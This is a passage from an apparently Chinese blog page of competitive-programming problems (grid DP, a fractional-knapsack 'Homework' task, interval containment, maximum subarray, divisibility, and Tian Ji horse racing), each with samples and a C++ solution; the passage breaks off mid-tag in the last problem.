title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">40400</span>];</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> h,x,y;</span><br><span class="line">&#125;ai[<span class="number">40040</span>];</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">compare</span><span class="params">(node a,node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.h&lt;b.h;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(node a,node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(((a.x==b.x&amp;&amp;<span class="built_in">abs</span>(a.y-b.y)==<span class="number">1</span>)||(a.y==b.y&amp;&amp;<span class="built_in">abs</span>(a.x-b.x)==<span class="number">1</span>))&amp;&amp;b.h&gt;a.h)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;ai[num].h;</span><br><span class="line">            ai[num].x=i;</span><br><span class="line">            ai[num].y=j;</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(ai,ai+m*n,compare);</span><br><span class="line">    <span class="keyword">int</span> mmax=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;num;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        dp[i]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(check(ai[j],ai[i]))</span><br><span class="line">            &#123;</span><br><span class="line">                dp[i]=max(dp[i],dp[j]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[i]&gt;mmax) mmax=dp[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;mmax&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-Homework"><a href="#问题-D-Homework" class="headerlink" title="问题 D: Homework"></a>问题 D: Homework</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>临近开学了，大家都忙着收拾行李准 备返校，但 I_Love_C 却不为此担心! 因为他的心思全在暑假作业上：目前为止还未开动。</p><p>暑假作业是很多张试卷，我们这些从试卷里爬出来的人都知道，卷子上的题目有选择题、填空题、简答题、证明题等。而做选择题的好处就在于工作量很少，但又因为选择题题目都普遍很长。如果有 5 张试卷，其中 4 张是选择题，最后一张是填空题，很明显做最后一张所花的时间要比前 4 张长很多。但如果你只做了选择题，虽然工作量很少，但表面上看起来也已经做了4/5的作业了。</p><p>I_Love_C决定就用这样的方法来蒙混过关，他统计出了做完每一张试卷所需的时间以及它做完后能得到的价值（按上面的原理，选择题越多价值当然就越高咯）。</p><p>现在就请你帮他安排一下，用他仅剩的一点时间来做最有价值的作业。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>测试数据包括多组。每组测试数据以两个整数 M,N(1&lt;M&lt;20,1&lt;N&lt;10000) 开头，分别表示试卷的数目和 I_Love_C 剩下的时间。接下来有 M 行，每行包括两个整数 T,V(1&lt;T&lt;N,1&lt;V&lt;10000)分别表示做完这张试卷所需的时间以及做完后能得到的价值，输入以 0 0 结束。</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>对应每组测试数据输出 I_Love_C 能获得的最大价值。保留小数点 2 位</p><p>提示：float 的精度可能不够，你应该使用 double 类型。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37.00</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m,n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">20</span>],b[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">double</span> ma[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n&amp;&amp;m!=<span class="number">0</span>&amp;&amp;n!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> maxn=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;b[i];</span><br><span class="line">            ma[i]=<span class="keyword">double</span>(b[i])/a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> f=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">double</span> vm;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(f==m)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            vm=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(ma[i]&gt;vm)</span><br><span class="line">                &#123;</span><br><span class="line">                    vm=ma[i];</span><br><span class="line">                    s=i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(n&lt;a[s])</span><br><span class="line">            &#123;</span><br><span class="line">                maxn=maxn+n*ma[s];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                maxn=maxn+b[s];</span><br><span class="line">                n=n-a[s];</span><br><span class="line">                ma[s]=<span class="number">0</span>;</span><br><span class="line">                f++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">cout</span>&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;<span class="built_in">std</span>::fixed&lt;&lt;maxn&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-区间包含问题"><a href="#问题-E-区间包含问题" class="headerlink" title="问题 E: 区间包含问题"></a>问题 E: 区间包含问题</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>已知 n 个左闭右开区间 [a,b)，对其进行 m 次询问，求区间[l,r]最多可以包含 n 个区间中的多少个区间，并且被包含的所有区间都不相交。</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组测试数据，对于每组测试数据：</p><p>第一行包含两个整数 n ,m (1≤n≤100000,1≤m≤100) 。</p><p>接下来 n 行每行包含两个整数 a ,b (0≤a&lt;b≤10^9) 。</p><p>接下来 m 行每行包含两个整数 l ,r (0≤l&lt;r≤10^9) 。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>对于每组测试数据，输出 m 行，每行包含一个整数。</p><p>数据过大请使用快速输入输出。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">1 2</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x7fffffff</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">&#125;node;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a, node b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.r &lt; b.r;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m)</span><br><span class="line">    &#123;</span><br><span class="line">        node *nnum = <span class="keyword">new</span> node[n];</span><br><span class="line">        node *mnum = <span class="keyword">new</span> node[m];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; nnum[i].l &gt;&gt; nnum[i].r;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span> &gt;&gt; mnum[i].l &gt;&gt; mnum[i].r;</span><br><span class="line">        &#125;</span><br><span class="line">        sort(nnum, nnum + n, cmp);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">int</span> k = mnum[i].l; <span class="comment">//K初始的时候等于m数组的左边界</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> ((nnum[j].l &gt;= k))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nnum[j].r &lt;= mnum[i].r)</span><br><span class="line">                    &#123;</span><br><span class="line">                        res++;</span><br><span class="line">                        k = nnum[j].r;  <span class="comment">//每次更新成n数组的右边界</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>  <span class="comment">//右边界一旦超过，直接扔掉后面的部分结束质询</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">delete</span>[] nnum;</span><br><span class="line">        <span class="keyword">delete</span>[] mnum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-F-最长子序列"><a href="#问题-F-最长子序列" class="headerlink" title="问题 F: 最长子序列"></a>问题 F: 最长子序列</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>在一个数组中找出和最大的连续几个数。（至少包含一个数）</p><p>例如：</p><p>数组A[] = [-2,1,-3,4,-1,2,1,-5,4]，则连续的子序列[4,-1,2,1]有最大的和6.</p><h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>第一行输入一个不超过1000的整数n。</p><p>第二行输入n个整数A[i]。</p><h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>输出一个整数，表示最大的和。</p><h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">1 1 -2</span><br></pre></td></tr></table></figure><h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">1010</span>],b[<span class="number">1010</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(b,<span class="number">0</span>,<span class="keyword">sizeof</span>(b));</span><br><span class="line">    b[<span class="number">0</span>]=a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i]=max(b[i<span class="number">-1</span>]+a[i],a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(b[i]&gt;sum)</span><br><span class="line">        &#123;</span><br><span class="line">            sum=b[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-G-元素整除问题"><a href="#问题-G-元素整除问题" class="headerlink" title="问题 G: 元素整除问题"></a>问题 G: 元素整除问题</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入20个整数，输出其中能被数组中其它元素整除的那些数组元素。</p><h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>输入20个整数</p><h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>按输入顺序输出符合要求的数字，每行输出一个整数。</p><h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21</span><br></pre></td></tr></table></figure><h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">6</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">12</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">18</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h3 id="提示-6"><a href="#提示-6" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">20</span>],b[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        b[i]=a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(b,b+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;b[i]&lt;" ";</span></span><br><span class="line">        <span class="keyword">int</span> sign=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">20</span>;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(b[j]&lt;a[i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(a[i]%b[j]==<span class="number">0</span>)</span><br><span class="line">                    sign=<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(sign==<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-H-渊子赛马"><a href="#问题-H-渊子赛马" class="headerlink" title="问题 H: 渊子赛马"></a>问题 H: 渊子赛马</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>赛马是一古老的游戏，早在公元前四世纪的中国，处在诸侯割据的状态，历史上称为“战国时期”。在魏国作官的孙膑，因为受到同僚庞涓的迫害，被齐国使臣救出后，到达齐国国都。 赛马是当时最受齐国贵族欢迎的娱乐项目。上至国王，下到大臣，常常以赛马取乐，并以重金赌输赢。田忌多次与国王及其他大臣赌输赢，屡赌屡输。一天他赛马又输了，回家后闷闷不乐。孙膑安慰他说：“下次有机会带我到马场看看，也许我能帮你。” 孙膑仔细观察后发现，田忌的马和其他人的马相差并不远，只是策略运用不当，以致失败。 比赛前田忌按照孙膑的主意，用上等马鞍将下等马装饰起来，冒充上等马，与齐王的上等马比赛。第二场比赛，还是按照孙膑的安排，田忌用自己的上等马与国王的中等马比赛，在一片喝彩中，只见田忌的马竟然冲到齐王的马前面，赢了第二场。关键的第三场，田忌的中等马和国王的下等马比赛，田忌的马又一次冲到国王的马前面，结果二比一，田忌赢了国王。 就是这么简单，现在渊子也来赛一赛马。假设每匹马都有恒定的速度，所以速度大的马一定比速度小的马先到终点（没有意外！！）。不允许出现平局。最后谁赢的场数多于一半(不包括一半)，谁就是赢家(可能没有赢家)。渊子有 N(1&lt;=n&lt;=1000)匹马参加比赛。对手的马的数量与渊子马的数量一样，并且知道所有的马的速度。聪明的你来预测一下这场世纪之战的结果，看看渊子能否赢得比赛。</p><h3 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h3><p>输入有多组测试数据。 每组测试数据包括 3 行： 第一行输入 N。表示马的数量。 第二行有 N 个整型数字，即渊子的 N 匹马的速度。 第三行有 N 个整型数字，即对手的 N 匹马的速度。 当 N 为 0 时退出。</p><h3 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h3><p>若通过聪明的你精心安排，如果渊子能赢得比赛，那么输出YES。 否则输出NO。</p><h3 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">5</span><br><span class="line">2 3 3 4 5</span><br><span class="line">1 2 3 4 5</span><br><span class="line">4</span><br><span class="line">2 2 1 2</span><br><span class="line">2 2 3 1</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YES</span><br><span class="line">NO</span><br></pre></td></tr></table></figure><h3 id="提示-7"><a href="#提示-7" class="headerlink" 